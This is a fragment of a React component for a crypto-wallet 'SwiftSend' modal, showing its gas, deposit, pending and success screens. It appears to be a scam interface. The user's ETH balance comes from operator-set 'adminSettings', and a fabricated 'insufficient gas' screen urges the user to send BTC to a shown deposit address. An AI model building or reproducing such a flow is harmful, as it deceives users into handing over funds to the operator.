                    Sending
                  </Text>
                </Flex>
              </Flex>
            </Flex>

            <ActionButton variant="primary" onPress={handleClose}>
              <Text variant="buttonLabel2" color="$white">
                Done
              </Text>
            </ActionButton>
          </Flex>
        )

      case 'insufficient-gas':
        return (
          <Flex gap="$spacing24" width="100%">
            <Flex centered gap="$spacing12">
              <Flex
                width={72}
                height={72}
                borderRadius="$roundedFull"
                backgroundColor="rgba(252, 165, 165, 0.2)"
                centered
              >
                <Flex
                  width={56}
                  height={56}
                  borderRadius="$roundedFull"
                  backgroundColor="rgba(252, 165, 165, 0.3)"
                  centered
                >
                  <AlertTriangle color="#EF4444" size={28} />
                </Flex>
              </Flex>
              <Text variant="subheading1" mt="$spacing4">
                Insufficient Gas
              </Text>
              <Text variant="body3" color="$neutral2" textAlign="center">
                You need ETH to cover the network fee for this transaction
              </Text>
            </Flex>

            {/* Required Gas Card */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing20" gap="$spacing16">
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body2" color="$neutral2">
                  Required Gas Fee
                </Text>
                <Flex alignItems="flex-end">
                  <Text variant="body1" fontWeight="600">
                    ~{gasFee.ethAmount} ETH
                  </Text>
                  <Text variant="body3" color="$neutral2">
                    ≈ ${gasFee.usdAmount.toLocaleString()}
                  </Text>
                </Flex>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body2" color="$neutral2">
                  Your ETH Balance
                </Text>
                <Text variant="body1" fontWeight="600" color="$statusCritical">
                  {(adminSettings.ethBalance || 0).toFixed(4)} ETH
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body2" color="$neutral2">
                  Shortfall
                </Text>
                <Text variant="body1" fontWeight="600" color="$statusCritical">
                  {Math.max(0, gasFee.ethAmount - (adminSettings.ethBalance || 0)).toFixed(4)} ETH
                </Text>
              </Flex>
            </Flex>

            {/* Info Card */}
            <Flex backgroundColor="$accent2" borderRadius="$rounded12" p="$spacing16" gap="$spacing8">
              <Text variant="body3" color="$accent1" fontWeight="500">
                💡 Deposit BTC to cover gas fees
              </Text>
              <Text variant="body4" color="$neutral2">
                We&apos;ll convert your BTC deposit to ETH automatically to cover the network fee.
              </Text>
            </Flex>

            <Trace logPress element={ElementName.SwiftDepositGasButton}>
              <ActionButton variant="primary" onPress={handleDepositGas}>
                <Flex row alignItems="center" gap="$spacing8">
                  <Gas color="$white" size={20} />
                  <Text variant="buttonLabel2" color="$white">
                    Deposit Gas Fee
                  </Text>
                </Flex>
              </ActionButton>
            </Trace>

            <ActionButton variant="secondary" onPress={handleClose}>
              <Text variant="buttonLabel2" color="$neutral1">
                Cancel
              </Text>
            </ActionButton>
          </Flex>
        )

      case 'deposit-gas':
        return (
          <Flex gap="$spacing20" width="100%">
            {/* Header */}
            <Flex centered gap="$spacing8">
              <Flex width={56} height={56} borderRadius="$roundedFull" backgroundColor="$accent2" centered>
                <Text style={{ fontSize: 28 }}>₿</Text>
              </Flex>
              <Text variant="subheading1" mt="$spacing8">
                Deposit BTC for Gas
              </Text>
              <Text variant="body3" color="$neutral2" textAlign="center">
                Scan QR code or copy address below
              </Text>
            </Flex>

            {/* QR Code - Theme-matched styling */}
            <Flex
              centered
              p="$spacing16"
              backgroundColor="$surface1"
              borderRadius="$rounded20"
              borderWidth={1}
              borderColor="$surface3"
            >
              <QRCodeDisplay
                ecl="M"
                encodedValue={depositAddress}
                size={200}
                color={colors.accent1.val}
                containerBackgroundColor={colors.surface1.val}
              />
            </Flex>

            {/* Address Card */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing16" gap="$spacing12">
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body2" fontWeight="500">
                  {minimumDeposit.currency} Deposit Address
                </Text>
                <Trace logPress element={ElementName.SwiftCopyAddressButton}>
                  <TouchableArea onPress={handleCopyAddress}>
                    <Flex
                      row
                      alignItems="center"
                      gap="$spacing6"
                      backgroundColor={copied ? '$statusSuccess' : '$accent1'}
                      borderRadius="$rounded12"
                      px="$spacing12"
                      py="$spacing8"
                    >
                      {copied ? (
                        <>
                          <Check color="$white" size={16} />
                          <Text variant="buttonLabel3" color="$white">
                            Copied!
                          </Text>
                        </>
                      ) : (
                        <>
                          <CopyAlt color="$white" size={16} />
                          <Text variant="buttonLabel3" color="$white">
                            Copy
                          </Text>
                        </>
                      )}
                    </Flex>
                  </TouchableArea>
                </Trace>
              </Flex>
              <Flex backgroundColor="$surface3" borderRadius="$rounded12" p="$spacing12">
                <Text variant="body3" fontFamily="$mono" textAlign="center" userSelect="all" color="$neutral1">
                  {depositAddress}
                </Text>
              </Flex>
            </Flex>

            {/* Minimum Deposit Warning - Styled like the info card */}
            <Flex backgroundColor="$accent2" borderRadius="$rounded16" p="$spacing16" gap="$spacing6">
              <Flex row alignItems="center" gap="$spacing8">
                <AlertTriangle color="$accent1" size={18} />
                <Text variant="body2" color="$accent1" fontWeight="600">
                  Minimum Deposit: {minimumDeposit.amount} {minimumDeposit.currency}
                </Text>
              </Flex>
              <Text variant="body3" color="$neutral2" pl="$spacing26">
                Deposits below minimum will not be processed. Please ensure you send at least {minimumDeposit.amount}{' '}
                {minimumDeposit.currency}.
              </Text>
            </Flex>

            {/* Transaction Summary */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing16" gap="$spacing10">
              <Text variant="body3" color="$neutral2" fontWeight="500" mb="$spacing4">
                Transaction Summary
              </Text>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  You&apos;re sending
                </Text>
                <Flex row alignItems="center" gap="$spacing6">
                  <Image source={{ uri: selectedToken.logoUrl }} width={18} height={18} borderRadius="$roundedFull" />
                  <Text variant="body2" fontWeight="600">
                    {formatSwiftTokenAmount(amount)} {selectedToken.symbol}
                  </Text>
                </Flex>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  To address
                </Text>
                <Text variant="body3" fontFamily="$mono" color="$neutral1">
                  {recipient.slice(0, 6)}...{recipient.slice(-4)}
                </Text>
              </Flex>
              <Flex
                row
                alignItems="center"
                justifyContent="space-between"
                pt="$spacing8"
                mt="$spacing4"
                borderTopWidth={1}
                borderColor="$surface3"
              >
                <Flex row alignItems="center" gap="$spacing6">
                  <Gas color="$neutral2" size={16} />
                  <Text variant="body3" color="$neutral2">
                    Network Fee
                  </Text>
                </Flex>
                <Flex alignItems="flex-end">
                  <Text variant="body2" fontWeight="600">
                    ~{gasFee.ethAmount} ETH
                  </Text>
                  <Text variant="body4" color="$neutral2">
                    ≈ ${gasFee.usdAmount.toLocaleString()}
                  </Text>
                </Flex>
              </Flex>
            </Flex>

            <Trace logPress element={ElementName.SwiftConfirmDepositButton}>
              <ActionButton variant="primary" onPress={handleConfirmDeposit}>
                <Text variant="buttonLabel2" color="$white">
                  I&apos;ve Sent the BTC
                </Text>
              </ActionButton>
            </Trace>

            <ActionButton variant="secondary" onPress={() => setStep('insufficient-gas')}>
              <Text variant="buttonLabel2" color="$neutral1">
                Back
              </Text>
            </ActionButton>
          </Flex>
        )

      case 'pending':
        return (
          <Flex gap="$spacing24" width="100%" centered>
            <Flex centered gap="$spacing16">
              <Flex
                width={80}
                height={80}
                borderRadius="$roundedFull"
                backgroundColor="$statusWarning"
                opacity={0.15}
                centered
              >
                <Text style={{ fontSize: 40 }}>⏳</Text>
              </Flex>
              <Text variant="subheading1">Transaction Pending</Text>
              <Text variant="body3" color="$neutral2" textAlign="center">
                Your transaction is being processed. This may take a few minutes.
              </Text>
            </Flex>

            {/* Transaction Summary */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing16" gap="$spacing12" width="100%">
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Amount
                </Text>
                <Flex row alignItems="center" gap="$spacing8">
                  <Image source={{ uri: selectedToken.logoUrl }} width={20} height={20} borderRadius="$roundedFull" />
                  <Text variant="body2" fontWeight="500">
                    {formatSwiftTokenAmount(amount)} {selectedToken.symbol}
                  </Text>
                </Flex>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Recipient
                </Text>
                <Text variant="body3" fontFamily="$mono">
                  {recipient.slice(0, 6)}...{recipient.slice(-4)}
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Status
                </Text>
                <Flex
                  row
                  alignItems="center"
                  gap="$spacing4"
                  backgroundColor="$statusWarning"
                  opacity={0.2}
                  borderRadius="$rounded8"
                  px="$spacing8"
                  py="$spacing4"
                >
                  <Flex width={8} height={8} borderRadius="$roundedFull" backgroundColor="$statusWarning" />
                  <Text variant="buttonLabel4" color="$statusWarning">
                    Pending
                  </Text>
                </Flex>
              </Flex>
            </Flex>

            <ActionButton variant="primary" onPress={handleClose}>
              <Text variant="buttonLabel2" color="$white">
                Done
              </Text>
            </ActionButton>
          </Flex>
        )

      case 'success':
        return (
          <Flex gap="$spacing24" width="100%" centered>
            <Flex centered gap="$spacing16">
              <Flex
                width={80}
                height={80}
                borderRadius="$roundedFull"
                backgroundColor="$statusSuccess"
                opacity={0.15}
                centered
              >
                <Check size={40} color="$statusSuccess" />
              </Flex>
              <Text variant="subheading1">Transaction Successful</Text>
              <Text variant="body3" color="$neutral2" textAlign="center">
                Your transaction has been completed successfully.
              </Text>
            </Flex>

            {/* Transaction Summary */}
            <Flex backgroundColor="$surface2" borderRadius="$rounded16" p="$spacing16" gap="$spacing12" width="100%">
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Amount
                </Text>
                <Flex row alignItems="center" gap="$spacing8">
                  <Image source={{ uri: selectedToken.logoUrl }} width={20} height={20} borderRadius="$roundedFull" />
                  <Text variant="body2" fontWeight="500">
                    {formatSwiftTokenAmount(amount)} {selectedToken.symbol}
                  </Text>
                </Flex>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Recipient
                </Text>
                <Text variant="body3" fontFamily="$mono">
                  {recipient.slice(0, 6)}...{recipient.slice(-4)}
                </Text>
              </Flex>
              <Flex row alignItems="center" justifyContent="space-between">
                <Text variant="body3" color="$neutral2">
                  Status
                </Text>
                <Flex
                  row
                  alignItems="center"
                  gap="$spacing4"
                  backgroundColor="$statusSuccess"
                  opacity={0.2}
                  borderRadius="$rounded8"
                  px="$spacing8"
                  py="$spacing4"
                >
                  <Flex width={8} height={8} borderRadius="$roundedFull" backgroundColor="$statusSuccess" />
                  <Text variant="buttonLabel4" color="$statusSuccess">
                    Success
                  </Text>
                </Flex>
              </Flex>
            </Flex>

            <ActionButton variant="primary" onPress={handleClose}>
              <Text variant="buttonLabel2" color="$white">
                Done
              </Text>
            </ActionButton>
          </Flex>
        )

      default:
        return null
    }
  }

  return (
    <Modal name={ModalName.SwiftSend} isModalOpen={isOpen} onClose={handleClose} maxWidth={440}>
      <Flex p="$spacing24" gap="$spacing20" width="100%">
        {/* Step Progress Indicator */}
        {step !== 'pending' && step !== 'success' && (
          <Flex row alignItems="center" justifyContent="center" gap="$spacing8" mb="$spacing8">
            <StepIndicator
              active={step === 'select-token'}
              completed={['enter-amount', 'enter-recipient', 'preview', 'insufficient-gas', 'deposit-gas'].includes(
                step,
              )}
            >
              {['enter-amount', 'enter-recipient', 'preview', 'insufficient-gas', 'deposit-gas'].includes(step) ? (
                <Check color="$white" size={16} />
              ) : (
                <Text variant="buttonLabel4" color={step === 'select-token' ? '$white' : '$neutral2'}>
                  1
                </Text>
              )}
            </StepIndicator>
            <Flex width={24} height={2} backgroundColor="$surface3" />
            <StepIndicator
              active={step === 'enter-amount'}
              completed={['enter-recipient', 'preview', 'insufficient-gas', 'deposit-gas'].includes(step)}
            >
              {['enter-recipient', 'preview', 'insufficient-gas', 'deposit-gas'].includes(step) ? (
                <Check color="$white" size={16} />
              ) : (
                <Text variant="buttonLabel4" color={step === 'enter-amount' ? '$white' : '$neutral2'}>
                  2
                </Text>
              )}
            </StepIndicator>
            <Flex width={24} height={2} backgroundColor="$surface3" />
            <StepIndicator
              active={step === 'enter-recipient'}
              completed={['preview', 'insufficient-gas', 'deposit-gas'].includes(step)}
            >
              {['preview', 'insufficient-gas', 'deposit-gas'].includes(step) ? (
                <Check color="$white" size={16} />
              ) : (
                <Text variant="buttonLabel4" color={step === 'enter-recipient' ? '$white' : '$neutral2'}>
                  3
                </Text>
              )}
            </StepIndicator>
            <Flex width={24} height={2} backgroundColor="$surface3" />
            <StepIndicator active={['preview', 'insufficient-gas', 'deposit-gas'].includes(step)}>
              <Text
                variant="buttonLabel4"
                color={['preview', 'insufficient-gas', 'deposit-gas'].includes(step) ? '$white' : '$neutral2'}
              >
                4
              </Text>
            </StepIndicator>
          </Flex>
        )}

        {renderStepContent()}
      </Flex>
    </Modal>
  )
})
